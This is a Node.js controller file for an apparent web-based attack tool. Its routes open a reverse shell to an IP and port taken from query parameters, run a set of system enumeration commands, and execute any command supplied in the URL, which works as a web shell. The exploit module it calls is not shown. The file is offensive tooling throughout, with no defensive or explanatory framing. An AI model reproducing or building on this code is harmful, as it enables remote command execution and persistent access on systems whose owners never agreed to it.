`use strict`;

const exploit = require(`./exploit`),
  service = require(`./service`),
  template = require(`./template`);

/********************
 * Controller - Flow control of async/sync
 *******************/

/**
 * Builds the home page with buttons and routes to exploits
 * @param {Object} req 
 * @param {Object} res 
 */
const homePage = (req, res) => {
  const originURL = service.getOrigin(req);

  const html = template.buildHomePage(originURL);
  service.writeHtml(res, html);
};

/**
 * Will use query params to create a reverse shell
 * @param {Object} req 
 * @param {Object} res 
 */
const reversePage = (req, res) => {
  const ip = req.query.ip,
    port = req.query.port,
    shell = req.query.shell;

  exploit.runReverseShell(ip, port, shell);

  const html = template.buildReversePage(ip, port, shell);
  service.writeHtml(res, html);
};

/**
 * Builds a HTML table that will display a summary of some enumeration commands
 * @param {Object} req 
 * @param {Object} res 
 */
const summaryPage = async (req, res) => {
  const report = await exploit.runCommands();

  const sections = service.getSections(report);
  const commands = service.getCommands(report);

  const html = template.buildSummaryPage(sections, commands);
  service.writeHtml(res, html);
};

/**
 * Builds and HTML page that will display the repsonse of the command
 * @param {Object} req 
 * @param {Object} res 
 */
const runPage = async (req, res) => {
  const command = await exploit.runCommand(req.query.command);

  const html = template.buildRunPage(command);
  service.writeHtml(res, html);
};

module.exports = {
  homePage,
  reversePage,
  summaryPage,
  runPage
};
